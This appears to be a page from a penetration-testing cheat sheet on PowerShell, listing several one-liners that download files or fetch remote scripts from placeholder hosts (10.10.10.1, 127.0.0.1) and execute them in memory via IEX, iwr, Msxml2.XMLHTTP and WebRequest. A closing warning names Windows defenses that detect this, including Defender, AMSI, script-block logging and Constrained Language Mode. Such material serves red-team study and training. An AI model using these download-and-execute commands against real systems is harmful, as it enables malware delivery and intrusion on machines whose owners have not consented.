# Powershell

PowerShell can be leveraged in Windows >= 7, Windows Server >= 2008

### Download to Disk

```
PS C:\> powershell -c "(New-Object System.Net.Webclient).DownloadFile('http://127.0.0.1/some.file', 'some.file')"
```

```
C:\> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/some.file', 'some.file')
```

### Download and execute from Memory

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/file.ps1')
```

#### PSv3

```
PS C:\> iex (iwr 'http://10.10.10.1/file.ps1')
```

```
PS C:\> $f=New-Object -ComObject
PS C:\> Msxml2.XMLHTTP;$f.open('GET','http://10.10.10.1/file.ps1',$false);$f.send();iex $f.responseText
```

```
PS C:\> $wr=[System.NET.WebRequest]::Create('http://10.10.10.1/file.ps1')
PS C:\> $r = $wr.GetResponse()
PS C:\> ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

{% hint style="warning" %}
Use of IEX will be detected by Windows Defender

Unprotected system wide transcription logs all Powershell command interactions

Logging of blocked script execution (Warning Event ID 4103, Verbose Event IT 4104)

AntiMalware Scan Interface (AMSI)

Contrained Language Mode (CLM) - an integration with Applocker and Device Guard (WADC)
{% endhint %}

###
